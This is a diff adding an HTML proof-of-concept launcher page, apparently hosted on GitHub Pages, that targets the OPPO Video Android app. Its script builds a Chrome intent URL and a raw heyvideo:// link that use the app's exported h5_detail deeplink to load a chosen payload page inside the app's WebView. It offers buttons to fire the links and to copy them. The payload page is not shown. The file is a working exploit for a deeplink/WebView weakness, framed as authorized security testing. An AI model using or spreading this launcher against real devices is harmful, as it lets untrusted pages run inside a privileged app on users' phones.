@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Open OPPO Video PoC</title>
+  <style>
+    :root { font-family: system-ui, -apple-system, Segoe UI, sans-serif; color-scheme: light dark; }
+    body { margin: 0; padding: 24px; background: #0b1020; color: #eef2ff; }
+    main { max-width: 760px; margin: auto; }
+    .card { background: #151b32; border: 1px solid #29314f; border-radius: 18px; padding: 22px; margin: 14px 0; box-shadow: 0 14px 40px #0004; }
+    h1 { margin: 0 0 10px; font-size: 26px; }
+    p { line-height: 1.55; }
+    a.btn, button { display: inline-block; cursor: pointer; border: 0; border-radius: 12px; padding: 13px 16px; margin: 6px 8px 6px 0; font-weight: 800; background: #7c3aed; color: white; text-decoration: none; }
+    a.secondary, button.secondary { background: #334155; }
+    pre, code { background: #070b16; border: 1px solid #27304d; border-radius: 10px; }
+    code { padding: 2px 6px; }
+    pre { padding: 12px; overflow-x: auto; white-space: pre-wrap; word-break: break-word; font-size: 13px; }
+    .muted { color: #a5b4fc; }
+    .warn { color: #fde68a; }
+  </style>
+</head>
+<body>
+<main>
+  <div class="card">
+    <h1>OPPO Video WebView PoC Launcher</h1>
+    <p class="muted">Harmless authorized testing page by Radit. This launcher opens OPPO Video through its exported deeplink route and loads the PoC payload page inside the app WebView.</p>
+    <p class="warn">If OPPO Video is installed, tap the button below. If Android asks which app to open, choose OPPO Video.</p>
+    <p>
+      <a id="intentBtn" class="btn" href="#">Open in OPPO Video</a>
+      <a id="schemeBtn" class="btn secondary" href="#">Fallback heyvideo:// link</a>
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>Debug links</h2>
+    <p>Payload page:</p>
+    <pre id="payloadOut"></pre>
+    <p>Intent URL:</p>
+    <pre id="intentOut"></pre>
+    <p>Raw scheme URL:</p>
+    <pre id="schemeOut"></pre>
+    <button class="secondary" onclick="copyText(document.getElementById('intentOut').textContent)">Copy intent URL</button>
+    <button class="secondary" onclick="copyText(document.getElementById('schemeOut').textContent)">Copy raw scheme URL</button>
+  </div>
+</main>
+<script>
+(function () {
+  // Payload is index.html in the same GitHub Pages directory.
+  const base = location.href.replace(/landing\.html(?:[?#].*)?$/, '');
+  const payload = base + (base.endsWith('/') ? '' : '/') + '?notDarkMode=true&from=landing';
+  const encodedPayload = encodeURIComponent(payload);
+
+  // Chrome/Android-friendly intent URL. This is the best link to put behind a normal HTTPS landing button.
+  const intentUrl = 'intent://global/h5_detail?url=' + encodedPayload + '#Intent;scheme=heyvideo;package=com.coloros.video;end';
+
+  // Raw custom scheme fallback. Some QR scanners/Android surfaces can open this directly.
+  const schemeUrl = 'heyvideo://global/h5_detail?url=' + encodedPayload;
+
+  document.getElementById('intentBtn').href = intentUrl;
+  document.getElementById('schemeBtn').href = schemeUrl;
+  document.getElementById('payloadOut').textContent = payload;
+  document.getElementById('intentOut').textContent = intentUrl;
+  document.getElementById('schemeOut').textContent = schemeUrl;
+})();
+
+function copyText(s) {
+  navigator.clipboard?.writeText(s).then(() => alert('Copied')).catch(() => prompt('Copy this:', s));
+}
+</script>
+</body>
+</html>
